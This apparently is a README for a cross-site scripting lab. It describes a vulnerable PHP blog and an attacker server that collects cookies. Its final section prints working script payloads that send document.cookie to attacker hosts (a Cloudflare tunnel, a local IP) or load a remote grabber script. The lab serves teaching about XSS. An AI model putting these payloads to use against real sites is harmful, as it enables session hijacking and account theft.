<h1>Cross-Site Scripting (XSS) - Lab</h1>

Build the following lab to demonstrate XSS:

- VM 1, LAMP-Stack with blog-platform (vulnerable blog)
- VM/Host for Cookie Stealing (see cookie stealer or flask grabber)
- Enable web-facing session hijacking with cloudflare tunnel (see how-to)

![XSS_Hosts](https://github.com/user-attachments/assets/d3e3f1ab-3312-47fa-bf03-6a66117756c3)

<b>Vulnerable target's file structure:</b>

<pre>
htm/
└── blog/
    ├── authenticate.php    --> check credentials
    ├── index.php           --> home page, requires login
    ├── login.html          --> Login-Page to POST credentials
    ├── posts.json          --> Database for Blogposts
    ├── save_post.php       --> writes a blogpost into posts.json 
    └── styles.css          --> CSS
</pre>
 
<b>Attacker's Apache-Server file structure:</b>
<pre>
html/
├── Cookies.txt           --> cookie-database with timestamps 
├── grabber.js            --> Receives cookie after XSS-execution and forwards it to saver.php
└── saver.php             --> Generates timestamp, saves cookie to txt-File
</pre>


Alternative attacker server:
- Flask-server for temporary saving of cookies (see flask_cookie_grabber.py)

<h2>Stealing the cookie</h2>
<h3>Over web with Flask + https:</h3>
<script>fetch('https://[IDENTIFIER]trycloudflare.com/grab?c='+encodeURIComponent(document.cookie))</script>

<h3>Within the Network with Flask:</h3>
<script>fetch('http://hostname/grab?c='+encodeURIComponent(document.cookie))</script>
<br>
Example: <br>
<script>fetch('http://10.10.80.2:8080/grab?c='+encodeURIComponent(document.cookie))</script>

<h3>Within the network with apache "C2"-Server </h3>
<script src="http://[IP]/cookiegrabber/grabber.js"></script>



